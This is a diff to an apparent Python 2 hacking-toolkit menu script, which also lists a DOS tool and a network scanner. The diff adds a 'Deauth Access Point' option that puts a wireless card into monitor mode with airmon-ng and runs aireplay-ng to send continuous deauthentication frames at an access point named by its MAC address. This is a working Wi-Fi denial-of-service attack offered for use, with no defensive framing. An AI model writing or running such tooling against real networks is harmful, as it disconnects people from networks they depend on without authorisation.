@@ -246,6 +246,32 @@ def networkScanner():
         info = str(process.read())
         print info
 
+def deauth():
+    print ga.red
+    os.system("clear")
+    os.system("figlet DEAUTH")
+    print "[1] wlan0"
+    print "[2] wlan1"
+    inter = input("> ")
+    if inter == 1:
+        c = "airmon-ng start wlan0"
+        p = os.popen(c)
+        interface = "wlan0mon"
+    elif inter == 2:
+        c = "airmon-ng start wlan1"
+        p = os.popen(c)
+        interface = "wlan1mon"
+    mac = raw_input("MAC Of The access point: ")
+    channel = raw_input("Channel: ")
+    os.system("clear")
+    os.system("figlet deauth Access Point")
+    print "Ctrl+C To Stop The Attack"
+    com = "iwconfig " + interface + " " +" channel " + channel
+    pr = os.popen(com)
+    command = "aireplay-ng --deauth  0 -a "+ mac + " " + interface 
+    process = os.popen(command)
+
+
 
 #################
 os.system("cls")
@@ -266,9 +292,10 @@ if soft == 1:
     print "[3]  IP-GeoLocate"
     print "[4]  DOS Tool"
     print "[5]  Network-Scanner"
-    print "[6]  Find WebSite Info"
-    print "[7]  Linux Update"
-    print "[8]  Termux Update"
+    print "[6]  Deauth Access Point"
+    print "[7]  Find WebSite Info"
+    print "[8]  Linux Update"
+    print "[9]  Termux Update"
     print "\n" 
 
     tool = input("----> ")
@@ -289,13 +316,16 @@ if soft == 1:
         networkScanner()
     
     elif tool == 6:
-        webSiteInfo()    
+        deauth()    
 
     elif tool == 7:
-        Update()
+        webSiteInfo()
 
     elif tool == 8:
-        termux()
+        Update()
+	
+    elif tool == 9:
+	termux()
 
 elif soft == 2:
     os.system("cls")
